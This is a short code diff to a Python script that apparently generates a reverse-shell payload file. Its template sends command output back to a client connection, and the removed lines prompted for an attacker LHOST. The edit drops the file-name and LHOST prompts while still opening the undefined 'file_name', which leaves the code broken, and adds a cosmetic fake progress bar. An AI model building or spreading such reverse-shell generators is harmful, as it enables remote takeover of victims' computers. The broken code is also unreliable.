@@ -1,8 +1,7 @@
 
 
 def pyload():
-    file_name = input("[*] Insert a file name.py: ")
-    ip = input("[!] Select Your LHOST: ")
+    print("[*] Insert a file name.py")
     arq = open(file_name, 'w')
     finish()
     temp = """
@@ -54,3 +53,21 @@ while True:
     client.send(output + output_error)
     """
     arq.write(temp + "\n")
+
+def finish():
+    print ("[*] Generating...")
+    os.system("clear")
+    print ("1%")
+    time.sleep(1.9)
+    os.system("clear")
+    print ("15%")
+    time.sleep(1.9)
+    os.system("clear")
+    print ("30%")
+    time.sleep(1.9)
+    os.system("clear")
+    print ("50%")
+    time.sleep(1.9)
+    os.system("clear")
+    print ("100%")
+    time.sleep(3)
